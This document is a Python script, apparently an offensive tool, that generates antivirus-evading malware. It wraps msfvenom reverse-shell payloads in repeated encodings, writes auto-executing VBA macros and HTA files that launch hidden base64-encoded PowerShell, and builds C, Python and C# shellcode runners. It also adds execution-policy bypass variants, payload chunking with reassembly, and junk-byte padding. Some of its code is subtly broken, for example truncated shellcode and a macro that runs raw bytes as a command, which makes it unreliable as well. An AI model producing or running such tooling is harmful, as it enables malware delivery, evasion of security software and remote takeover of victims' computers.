#!/usr/bin/env python3
import os
import subprocess
import base64
import random
import string
import json
from datetime import datetime

class AVEvasionGenerator:
    def __init__(self):
        self.output_dir = f"av_evasion_{int(datetime.now().timestamp())}"
        self.encoders = ['x86/shikata_ga_nai', 'x64/zutto_dekiru', 'cmd/powershell_base64', 'x86/call4_dword_xor']
        
    def generate_shellcode(self, payload_type, lhost, lport, arch='x86', format_type='raw'):
        print(f"\033[93m[*] Generating shellcode...\033[0m")
        
        cmd = [
            'msfvenom',
            '-p', payload_type,
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-a', arch,
            '-f', format_type
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, timeout=60)
            
            if result.returncode == 0:
                print(f"\033[92m[+] Shellcode generated ({len(result.stdout)} bytes)\033[0m")
                return result.stdout
            else:
                print(f"\033[91m[!] Generation failed\033[0m")
                return None
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return None
    
    def encode_payload(self, payload_type, lhost, lport, encoder, iterations=5):
        print(f"\033[93m[*] Encoding payload with {encoder} ({iterations} iterations)...\033[0m")
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        output_file = os.path.join(self.output_dir, f"encoded_{int(datetime.now().timestamp())}.exe")
        
        cmd = [
            'msfvenom',
            '-p', payload_type,
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-e', encoder,
            '-i', str(iterations),
            '-f', 'exe',
            '-o', output_file
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if os.path.exists(output_file):
                size = os.path.getsize(output_file)
                print(f"\033[92m[+] Encoded payload: {output_file}\033[0m")
                print(f"\033[97m  Size: {size} bytes\033[0m")
                print(f"\033[97m  Encoder: {encoder}\033[0m")
                print(f"\033[97m  Iterations: {iterations}\033[0m")
                
                return output_file
            else:
                print(f"\033[91m[!] Encoding failed\033[0m")
                return None
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return None
    
    def obfuscate_powershell(self, command):
        print(f"\033[93m[*] Obfuscating PowerShell command...\033[0m")
        
        encoded = base64.b64encode(command.encode('utf-16le')).decode()
        
        obfuscated_commands = [
            f"powershell -enc {encoded}",
            f"powershell -e {encoded}",
            f"powershell -w hidden -enc {encoded}",
            f"powershell -ExecutionPolicy Bypass -enc {encoded}",
            f"cmd /c powershell -w hidden -enc {encoded}",
            f"cmd /c echo {encoded} | powershell -nop -w hidden -enc -",
        ]
        
        print(f"\033[92m[+] Generated {len(obfuscated_commands)} obfuscated variants\033[0m")
        
        for i, cmd in enumerate(obfuscated_commands, 1):
            print(f"\033[97m  {i}. {cmd[:80]}...\033[0m")
        
        return obfuscated_commands
    
    def generate_vba_macro(self, shellcode):
        print(f"\033[93m[*] Generating VBA macro...\033[0m")
        
        shellcode_str = ''.join(f'\\x{b:02x}' for b in shellcode[:200])
        
        vba_code = f'''
Sub AutoOpen()
    Execute
End Sub

Sub Document_Open()
    Execute
End Sub

Sub Execute()
    Dim buf As String
    Dim code As Object
    
    buf = "{shellcode_str}"
    
    Set code = CreateObject("WScript.Shell")
    code.Run buf, 0, False
End Sub
'''
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        output_file = os.path.join(self.output_dir, 'macro.vba')
        
        with open(output_file, 'w') as f:
            f.write(vba_code)
        
        print(f"\033[92m[+] VBA macro saved: {output_file}\033[0m")
        
        return output_file
    
    def generate_hta_payload(self, powershell_command):
        print(f"\033[93m[*] Generating HTA payload...\033[0m")
        
        encoded = base64.b64encode(powershell_command.encode('utf-16le')).decode()
        
        hta_code = f'''
<html>
<head>
<script language="VBScript">
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -w hidden -enc {encoded}", 0, False
    window.close()
</script>
</head>
<body>
</body>
</html>
'''
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        output_file = os.path.join(self.output_dir, 'payload.hta')
        
        with open(output_file, 'w') as f:
            f.write(hta_code)
        
        print(f"\033[92m[+] HTA payload saved: {output_file}\033[0m")
        
        return output_file
    
    def split_payload(self, payload_file, chunk_size=1024):
        print(f"\033[93m[*] Splitting payload into chunks...\033[0m")
        
        try:
            with open(payload_file, 'rb') as f:
                payload_data = f.read()
            
            chunks = [payload_data[i:i+chunk_size] for i in range(0, len(payload_data), chunk_size)]
            
            os.makedirs(self.output_dir, exist_ok=True)
            
            chunk_files = []
            
            for i, chunk in enumerate(chunks):
                chunk_file = os.path.join(self.output_dir, f'chunk_{i}.bin')
                
                with open(chunk_file, 'wb') as f:
                    f.write(chunk)
                
                chunk_files.append(chunk_file)
            
            print(f"\033[92m[+] Split into {len(chunk_files)} chunks\033[0m")
            
            reassemble_script = os.path.join(self.output_dir, 'reassemble.ps1')
            
            with open(reassemble_script, 'w') as f:
                f.write(f'$chunks = @()\n')
                
                for i in range(len(chunk_files)):
                    f.write(f'$chunks += Get-Content -Path "chunk_{i}.bin" -Raw\n')
                
                f.write(f'$payload = $chunks -join ""\n')
                f.write(f'$payload | Out-File -FilePath "payload_full.exe" -Encoding Byte\n')
            
            print(f"\033[92m[+] Reassemble script: {reassemble_script}\033[0m")
            
            return chunk_files
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return None
    
    def generate_shellcode_runner(self, shellcode, language='c'):
        print(f"\033[93m[*] Generating shellcode runner ({language})...\033[0m")
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        if language == 'c':
            shellcode_hex = ','.join(f'0x{b:02x}' for b in shellcode[:500])
            
            c_code = f'''
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {{ {shellcode_hex} }};

int main() {{
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (mem != NULL) {{
        memcpy(mem, shellcode, sizeof(shellcode));
        
        ((void(*)())mem)();
    }}
    
    return 0;
}}
'''
            
            output_file = os.path.join(self.output_dir, 'runner.c')
            
            with open(output_file, 'w') as f:
                f.write(c_code)
        
        elif language == 'python':
            shellcode_hex = ''.join(f'\\x{b:02x}' for b in shellcode[:500])
            
            py_code = f'''
import ctypes

shellcode = b"{shellcode_hex}"

ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)

ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))

ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)

ctypes.windll.kernel32.WaitForSingleObject(-1, 0xFFFFFFFF)
'''
            
            output_file = os.path.join(self.output_dir, 'runner.py')
            
            with open(output_file, 'w') as f:
                f.write(py_code)
        
        elif language == 'csharp':
            shellcode_hex = ','.join(f'0x{b:02x}' for b in shellcode[:500])
            
            cs_code = f'''
using System;
using System.Runtime.InteropServices;

class ShellcodeRunner {{
    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    static void Main() {{
        byte[] shellcode = new byte[] {{ {shellcode_hex} }};
        
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        
        CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
    }}
}}
'''
            
            output_file = os.path.join(self.output_dir, 'Runner.cs')
            
            with open(output_file, 'w') as f:
                f.write(cs_code)
        
        print(f"\033[92m[+] Shellcode runner saved: {output_file}\033[0m")
        
        return output_file
    
    def add_junk_code(self, payload_file):
        print(f"\033[93m[*] Adding junk code to payload...\033[0m")
        
        try:
            with open(payload_file, 'rb') as f:
                payload_data = f.read()
            
            junk_size = random.randint(1024, 4096)
            junk_data = os.urandom(junk_size)
            
            modified_payload = junk_data + payload_data + junk_data
            
            output_file = os.path.join(self.output_dir, f'modified_{os.path.basename(payload_file)}')
            
            with open(output_file, 'wb') as f:
                f.write(modified_payload)
            
            print(f"\033[92m[+] Modified payload: {output_file}\033[0m")
            print(f"\033[97m  Original size: {len(payload_data)} bytes\033[0m")
            print(f"\033[97m  New size: {len(modified_payload)} bytes\033[0m")
            
            return output_file
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return None
    
    def generate_report(self, payloads):
        os.makedirs(self.output_dir, exist_ok=True)
        
        report_file = os.path.join(self.output_dir, 'evasion_report.json')
        
        report = {
            'generation_date': datetime.now().isoformat(),
            'output_directory': self.output_dir,
            'payloads_generated': len(payloads),
            'payloads': payloads
        }
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n\033[92m[+] Report saved: {report_file}\033[0m")

def run():
    print("\033[92m" + "="*70)
    print("     AV EVASION PAYLOAD GENERATOR")
    print("="*70 + "\033[0m\n")
    
    generator = AVEvasionGenerator()
    
    print("\033[97mAV Evasion Options:\033[0m")
    print("\033[97m  [1] Encode payload\033[0m")
    print("\033[97m  [2] Obfuscate PowerShell\033[0m")
    print("\033[97m  [3] Generate VBA macro\033[0m")
    print("\033[97m  [4] Generate HTA payload\033[0m")
    print("\033[97m  [5] Generate shellcode runner\033[0m")
    print("\033[97m  [6] Split payload\033[0m")
    
    choice = input(f"\n\033[95m[?] Select option: \033[0m").strip()
    
    generated_payloads = []
    
    if choice == '1':
        payload = input("\033[95m[?] Payload type (e.g., windows/meterpreter/reverse_tcp): \033[0m").strip()
        lhost = input("\033[95m[?] LHOST: \033[0m").strip()
        lport = input("\033[95m[?] LPORT: \033[0m").strip()
        
        print(f"\n\033[97m  Available encoders:\033[0m")
        for i, encoder in enumerate(generator.encoders, 1):
            print(f"\033[97m    {i}. {encoder}\033[0m")
        
        encoder_choice = input(f"\n\033[95m[?] Select encoder (1-{len(generator.encoders)}): \033[0m").strip()
        
        encoder = generator.encoders[int(encoder_choice) - 1] if encoder_choice.isdigit() else generator.encoders[0]
        
        iterations = input("\033[95m[?] Encoding iterations (default 5): \033[0m").strip()
        iterations = int(iterations) if iterations.isdigit() else 5
        
        output = generator.encode_payload(payload, lhost, lport, encoder, iterations)
        
        if output:
            generated_payloads.append({'type': 'encoded_exe', 'file': output})
    
    elif choice == '2':
        command = input("\033[95m[?] PowerShell command: \033[0m").strip()
        
        obfuscated = generator.obfuscate_powershell(command)
        
        output_file = os.path.join(generator.output_dir, 'obfuscated_commands.txt')
        os.makedirs(generator.output_dir, exist_ok=True)
        
        with open(output_file, 'w') as f:
            f.write('\n\n'.join(obfuscated))
        
        print(f"\n\033[92m[+] Saved: {output_file}\033[0m")
        
        generated_payloads.append({'type': 'powershell', 'file': output_file})
    
    elif choice == '3':
        payload = input("\033[95m[?] Payload type: \033[0m").strip()
        lhost = input("\033[95m[?] LHOST: \033[0m").strip()
        lport = input("\033[95m[?] LPORT: \033[0m").strip()
        
        shellcode = generator.generate_shellcode(payload, lhost, lport)
        
        if shellcode:
            output = generator.generate_vba_macro(shellcode)
            generated_payloads.append({'type': 'vba_macro', 'file': output})
    
    elif choice == '4':
        command = input("\033[95m[?] PowerShell command: \033[0m").strip()
        
        output = generator.generate_hta_payload(command)
        generated_payloads.append({'type': 'hta', 'file': output})
    
    elif choice == '5':
        payload = input("\033[95m[?] Payload type: \033[0m").strip()
        lhost = input("\033[95m[?] LHOST: \033[0m").strip()
        lport = input("\033[95m[?] LPORT: \033[0m").strip()
        language = input("\033[95m[?] Language (c/python/csharp): \033[0m").strip() or 'c'
        
        shellcode = generator.generate_shellcode(payload, lhost, lport)
        
        if shellcode:
            output = generator.generate_shellcode_runner(shellcode, language)
            generated_payloads.append({'type': f'shellcode_runner_{language}', 'file': output})
    
    elif choice == '6':
        payload_file = input("\033[95m[?] Payload file path: \033[0m").strip()
        chunk_size = input("\033[95m[?] Chunk size (bytes, default 1024): \033[0m").strip()
        chunk_size = int(chunk_size) if chunk_size.isdigit() else 1024
        
        chunks = generator.split_payload(payload_file, chunk_size)
        
        if chunks:
            generated_payloads.extend([{'type': 'chunk', 'file': c} for c in chunks])
    
    if generated_payloads:
        generator.generate_report(generated_payloads)
    
    print(f"\n\033[92m[+] Done\033[0m")

if __name__ == "__main__":
    run()
